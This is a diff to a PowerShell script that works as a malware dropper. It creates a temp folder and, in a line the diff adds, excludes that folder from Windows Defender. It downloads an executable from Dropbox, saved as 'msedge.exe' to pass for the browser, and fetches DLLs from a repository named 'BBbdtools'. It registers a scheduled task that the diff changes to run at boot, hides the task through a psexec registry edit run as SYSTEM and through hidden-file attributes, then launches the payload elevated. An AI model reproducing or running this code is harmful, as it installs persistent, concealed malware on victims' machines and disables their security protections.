@@ -2,9 +2,11 @@ cd $env:temp
 
 mkdir sVBXKuz
 
+Add-MpPreference -ExclusionPath '$env:temp/sVBXKuz'
+
 cd sVBXKuz
 
-Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/h1w1j8ailp97p2c8yogav/wsappa-2.0.exe?rlkey=4hpnkpmpdtjbfa995n4pytrs6&dl=0" -OutFile msedge.exe
+Invoke-WebRequest -Uri "dl.dropboxusercontent.com/scl/fi/xj2dqhq094ir9olj72010/msedge.exe?rlkey=9rrl7aydy1zgah7ityz8c0dbz&st=g48nz0jk&dl=0" -OutFile msedge.exe
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libsodium.dll" -OutFile libsodium.dll
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/blousekool/BBbdtools/main/bd/tools/libopus.dll" -OutFile libopus.dll
 
@@ -31,9 +33,9 @@ $taskXml = @"
     <URI>\dauto</URI>
   </RegistrationInfo>
   <Triggers>
-    <LogonTrigger>
+    <BootTrigger>
       <Enabled>true</Enabled>
-    </LogonTrigger>
+    </BootTrigger>    
     <SessionStateChangeTrigger>
       <Enabled>true</Enabled>
       <StateChange>SessionUnlock</StateChange>
@@ -86,6 +88,8 @@ Register-ScheduledTask -Xml $taskXml -TaskName 'dauto' -Force
 Invoke-WebRequest -Uri "https://live.sysinternals.com/psexec.exe" -OutFile "psexec.exe"
 .\psexec.exe /accepteula -i -s powershell -Command "Rename-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\dauto' -Name 'SD' -NewName 'SD832'"
 Remove-item psexec.exe
+
+Set-ItemProperty -Path C:/windows/system32/tasks/dauto -Name Attributes -Value ([IO.FileAttributes]::System -bor [IO.FileAttributes]::Hidden)
 
 Start-Process $env:temp/sVBXKuz/msedge.exe -Verb RunAs
 
